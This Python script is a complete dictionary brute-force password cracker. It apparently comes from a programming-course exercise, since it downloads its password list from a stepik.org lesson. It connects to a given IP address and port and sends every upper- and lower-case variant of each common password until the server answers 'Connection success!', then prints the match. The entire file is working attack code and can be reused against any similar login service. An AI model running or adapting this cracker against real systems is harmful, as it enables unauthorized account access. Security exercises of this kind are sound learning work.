import socket
import sys
import string
import itertools
import urllib.request


symbols = string.ascii_lowercase + string.digits
args = sys.argv
ip_address = args[1]
port = int(args[2])

url = 'https://stepik.org/media/attachments/lesson/255258/passwords.txt'
with urllib.request.urlopen(url) as f:
    passwords = f.read().decode('utf-8')

password_list = passwords.splitlines()

with socket.socket() as client_socket:
    address = (ip_address, port)
    client_socket.connect(address)
    for word in password_list:
        words_combo = itertools.product(*((c.lower(), c.upper()) for c in word))
        for w in words_combo:
            password = ''.join(w)
            data = password.encode()
            client_socket.send(data)
            response = client_socket.recv(1024)
            response = response.decode()
            if response == 'Wrong password!':
                continue
            elif response == 'Connection success!':
                print(password)
                exit()
            elif response == "Too many attempts":
                exit()
